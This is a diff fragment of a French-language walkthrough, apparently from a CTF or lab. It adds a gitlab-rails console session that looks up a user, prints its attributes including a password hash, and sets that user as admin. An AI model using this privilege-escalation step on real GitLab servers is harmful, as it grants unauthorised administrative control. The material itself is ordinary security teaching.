@@ -255,6 +255,32 @@ delete user ILMgLy6G55 - 200
 Maintenant que nous avons accès à la console gitlab nous pouvons donner les droits d'administrateur à notre user gitlab [gitlab console CheatSheet](https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html)
 
 ```bash
+git@gitlab:/$ gitlab-rails console
+
+irb(main):013:0> u=User.find_by_username('allta')                                                                                                               
+=> #<User id:36 @allta>  
+irb(main):014:0> pp u.attributes
+{"id"=>36,         
+ "email"=>"allta@rocks.al",  
+ "encrypted_password"=>
+  "$2a$10$9ZDZTCE0QjJArIL8WoIHBulQyqzad7Iv/TN5LvbkwCxgUbLeCPRAG",
+ "reset_password_token"=>nil,       
+ "reset_password_sent_at"=>nil,
+ "remember_created_at"=>nil,                         
+ "sign_in_count"=>2, 
+ "current_sign_in_at"=>Tue, 29 Jun 2021 14:43:31 UTC +00:00,
+ "last_sign_in_at"=>Thu, 24 Jun 2021 21:32:06 UTC +00:00,
+ "current_sign_in_ip"=>"172.19.0.1",
+ "last_sign_in_ip"=>"172.19.0.1",
+ "created_at"=>Thu, 24 Jun 2021 21:32:06 UTC +00:00,
+ "updated_at"=>Tue, 29 Jun 2021 14:43:31 UTC +00:00,
+ "name"=>"allta",           
+ "admin"=>false,    
+ 
+irb(main):020:0> u.admin=true
+=> true     
+irb(main):021:0> u.save!
+=> true     
 
 ```
 
